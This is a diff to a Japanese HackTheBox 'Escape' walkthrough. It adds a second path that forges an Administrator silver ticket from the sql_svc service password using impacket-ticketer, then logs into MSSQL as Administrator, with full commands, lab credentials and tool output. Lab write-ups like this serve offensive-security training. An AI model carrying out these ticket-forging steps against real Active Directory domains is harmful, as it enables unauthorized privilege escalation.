@@ -305,7 +305,8 @@ Info: Establishing connection to remote endpoint
 ```
 
 
-## STEP 4
+## PATH 1
+### STEP 4
 ログファイル内に、ユーザ名Ryan.Cooperのログイン失敗を確認  
 その後にユーザ名`NuclearMosquito3`で認証失敗を確認したが、こいつがパスワードかも
 ```powershell
@@ -342,7 +343,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 
-## STEP 5
+### STEP 5
 adcsの存在を確認
 ```sh
 └─$ netexec ldap 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3 -M adcs   
@@ -487,6 +488,177 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
 b5a13a12aae3171df977e2c051d44261
+```
+
+
+## PATH 2
+### STEP 4
+[リンク](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)  
+step3でmssqlを実行しているユーザsql_svcのクレデンシャルを取得したが、そのクレデンシャルを使用してmssqlのsilverチケットを作成が可能  
+administratorに偽装したsilverチケットでmssqlにログインが可能  
+silverチケットを作成するためにさらに必要な情報は以下の３つ
+1. サービスのntハッシュ
+2. ドメインのsid
+3. spn
+
+sql_svcの平文パスワードは取得したため、平文パスワードのmd4値を取得
+```sh
+└─$ python3.13 -c "import hashlib; print(hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).hexdigest())"
+1443ec19da4dac4ffc953bca1b57b4cf
+```
+ドメインのsidを取得
+```sh
+└─$ netexec ldap 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' --get-sid    
+LDAP        10.129.228.253  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+LDAPS       10.129.228.253  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+LDAPS       10.129.228.253  636    DC               Domain SID S-1-5-21-4078382237-1492182817-2568127209
+```
+今回はmssqlのspnは確認できず、しかし偽装したspnを設定可能らしい
+```sh
+└─$ netexec ldap 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie' --query '(servicePrincipalName=*)' 'servicePrincipalName'
+LDAP        10.129.228.253  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+LDAPS       10.129.228.253  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+LDAPS       10.129.228.253  636    DC               [+] Response for object: CN=DC,OU=Domain Controllers,DC=sequel,DC=htb
+LDAPS       10.129.228.253  636    DC               servicePrincipalName Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/ForestDnsZones.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/DomainDnsZones.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    DNS/dc.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    GC/dc.sequel.htb/sequel.htb
+LDAPS       10.129.228.253  636    DC                                    RestrictedKrbHost/dc.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    RestrictedKrbHost/DC
+LDAPS       10.129.228.253  636    DC                                    RPC/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    HOST/DC/sequel
+LDAPS       10.129.228.253  636    DC                                    HOST/dc.sequel.htb/sequel
+LDAPS       10.129.228.253  636    DC                                    HOST/DC
+LDAPS       10.129.228.253  636    DC                                    HOST/dc.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    HOST/dc.sequel.htb/sequel.htb
+LDAPS       10.129.228.253  636    DC                                    E3514235-4B06-11D1-AB04-00C04FC2DCD2/e758bd70-a92f-4f87-96f4-522f614c2fee/sequel.htb
+LDAPS       10.129.228.253  636    DC                                    ldap/DC/sequel
+LDAPS       10.129.228.253  636    DC                                    ldap/e758bd70-a92f-4f87-96f4-522f614c2fee._msdcs.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/sequel
+LDAPS       10.129.228.253  636    DC                                    ldap/DC
+LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb
+LDAPS       10.129.228.253  636    DC                                    ldap/dc.sequel.htb/sequel.htb
+LDAPS       10.129.228.253  636    DC               [+] Response for object: CN=krbtgt,CN=Users,DC=sequel,DC=htb
+LDAPS       10.129.228.253  636    DC               servicePrincipalName kadmin/changepw
+```
+ということで、administratorに偽装したsilverチケットを作成  
+存在しないユーザ名を指定したが、ridは500を指定しているためadministratorとして処理される
+```sh
+└─$ impacket-ticketer -spn 'test/dc.sequel.htb' -domain sequel.htb -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -nthash 1443ec19da4dac4ffc953bca1b57b4cf test
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sequel.htb/test
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in test.ccache
+```
+```sh
+└─$ impacket-describeTicket --rc4 1443ec19da4dac4ffc953bca1b57b4cf test.ccache 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 4774427770574247736c42705545584a
+[*] User Name                     : test
+[*] User Realm                    : SEQUEL.HTB
+[*] Service Name                  : test/dc.sequel.htb
+[*] Service Realm                 : SEQUEL.HTB
+[*] Start Time                    : 26/10/2025 00:44:54 AM
+[*] End Time                      : 24/10/2035 00:44:54 AM
+[*] RenewTill                     : 24/10/2035 00:44:54 AM
+[*] Flags                         : (0x50a00000) forwardable, proxiable, renewable, pre_authent
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : R3RCd3BXQkdzbEJwVUVYSg==
+[*] Kerberoast hash               : $krb5tgs$23$*USER$SEQUEL.HTB$test/dc.sequel.htb*$2d5a4b1b1bce131d4ec820d03c473f53$e1fc361f3de05b7665c6f450099d0f8e4acc8d4923ef37b1dd54e7648c3cbee0acd2fab0ce096a7520b2fa72fab5cc91fd6f1b05e2d6a8a3ab862f58a68ed76f8fa90b6763c4355ba9c91b1954c224b4dfaf2e711fc746db0bece81e56273314521c681caf4ed1c1ac5930374d86e3b8ccbb745aea22eafb24d2aa753a4d698e7da8c32f912cceb45dbd37f6e65a02cdd4c6592a9b1a59078b79efa3bf6c8f78737605226e66b8974d846c2ac6ce784d3e497f224a83f2531f2c6521d1cfbec709157d005c64beb6c1230b1f01b8d612a47e3ce67a71746c9c8f2980fbbccba872aa99a621e5897775e3021a2b7c96bcee77a2295f4355a91e4bef238ca92e1f681bfe6ee94b200605a6bb3af065014028fc9add8156442137c7899674b99fafb752cb33db174707992fd7845f762df6a425a5d0432d5529c7d202196438d7e783f4b097acd9201116233cc10030b59b7db10d85552ff0252f694dc4196418249366098e9e2d15fd225d48aee05f8f8aafefe9813b362adfe0971518b1c7a5109e7ca2d1fd5b273b10541b5fefcda834d77c31d8ee2c2badf317985bf94919ad9357aac51a378d5982f8aee3a14903a87d7a5666ab5e498991f3b67f39ea7341f1a15f34b2f7c8cd5cbcbd96e40da1c902e78bce96d3ee9e0b700cc056196f6e500af27e41bbb9e22bf4538d4116d6232c628688104765ea0284fb2e61617cc2fc5a99b68a26d5dec5156b54409c10ec747b9033da7cbb915fb7fdce18cc69a42d8b4a293d567a1044a4e6bad08a951c72bc9cb818eac8011ee38af7d51521fa26ac86dc19a49dd054fdf056c02118be570c69508589c5e077979d318a9583b06b327876a488a1c8ba8bab034611a2b5b3d7c2c1cae0f0de535de9ac2db8162e821ef9eb18d64132e7f3c02e9d8bf0c08baba906f6e20e74be6eba031cdd264797c438f41ea0b4e9dd5647c9aee7ca8ecf18d5be0c87273bd22501af03d178286a9c9c72db698435e91054987dfcf71dd40d6a30aed92981d690085500867ec5fbfafa30b07111d5fd38a72fcf78315005425db0415cc461175ac62346b865244ab3869594377e15f266b196af056aef70a4a005304bec0c4a02693bd47a8b27e59db57df72d70305aabe5d204f413830ba93b26027c054940f24eb48f1194b720bde59bc65d5fb2bf4686235e05683143214d492e3b4198862e49df1de8705f75658d0e34c8e9
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : test/dc.sequel.htb
+[*]   Service Realm               : SEQUEL.HTB
+[*]   Encryption type             : rc4_hmac (etype 23)
+[*] Decoding credential[0]['ticket']['enc-part']:
+[*]   LoginInfo                   
+[*]     Logon Time                : 26/10/2025 00:44:54 AM
+[*]     Logoff Time               : Infinity (absolute time)
+[*]     Kickoff Time              : Infinity (absolute time)
+[*]     Password Last Set         : 26/10/2025 00:44:54 AM
+[*]     Password Can Change       : Infinity (absolute time)
+[*]     Password Must Change      : Infinity (absolute time)
+[*]     LastSuccessfulILogon      : Infinity (absolute time)
+[*]     LastFailedILogon          : Infinity (absolute time)
+[*]     FailedILogonCount         : 0
+[*]     Account Name              : test
+[*]     Full Name                 : 
+[*]     Logon Script              : 
+[*]     Profile Path              : 
+[*]     Home Dir                  : 
+[*]     Dir Drive                 : 
+[*]     Logon Count               : 500
+[*]     Bad Password Count        : 0
+[*]     User RID                  : 500
+[*]     Group RID                 : 513
+[*]     Group Count               : 5
+[*]     Groups                    : 513, 512, 520, 518, 519
+[*]     Groups (decoded)          : (513) Domain Users
+[*]                                 (512) Domain Admins
+[*]                                 (520) Group Policy Creator Owners
+[*]                                 (518) Schema Admins
+[*]                                 (519) Enterprise Admins
+[*]     User Flags                : (0) 
+[*]     User Session Key          : 00000000000000000000000000000000
+[*]     Logon Server              : 
+[*]     Logon Domain Name         : SEQUEL.HTB
+[*]     Logon Domain SID          : S-1-5-21-4078382237-1492182817-2568127209
+[*]     User Account Control      : (528) USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
+[*]     Extra SID Count           : 0
+[*]     Extra SIDs                :
+[*]     Resource Group Domain SID :
+[*]     Resource Group Count      : 0
+[*]     Resource Group Ids        : 
+[*]     LMKey                     : 0000000000000000
+[*]     SubAuthStatus             : 0
+[*]     Reserved3                 : 0
+[*]   ClientName                  
+[*]     Client Id                 : 26/10/2025 00:44:54 AM
+[*]     Client Name               : test
+[*]   Attributes Info             
+[*]     Flags                     : (1) PAC_WAS_REQUESTED
+[*]   Requestor Info              
+[*]     UserSid                   : S-1-5-21-4078382237-1492182817-2568127209-500
+[*]   ServerChecksum              
+[*]     Signature Type            : hmac_md5
+[*]     Signature                 : c4ead6b5e8eb0d7cf8424a2d2c888609
+[*]   KDCChecksum                 
+[*]     Signature Type            : hmac_md5
+[*]     Signature                 : 5ab4c349f4678f39b7d3227b140b802b
+```
+作成したチケットでmssqlにログイン成功！
+```sh
+└─$ echo '10.129.228.253 dc.sequel.htb' | sudo tee -a /etc/hosts
+10.129.228.253 sequel.htb
+```
+```sh
+└─$ export KRB5CCNAME=test.ccache
+
+└─$ impacket-mssqlclient -k dc.sequel.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sequel\Administrator  dbo@master)> 
 ```
 
 
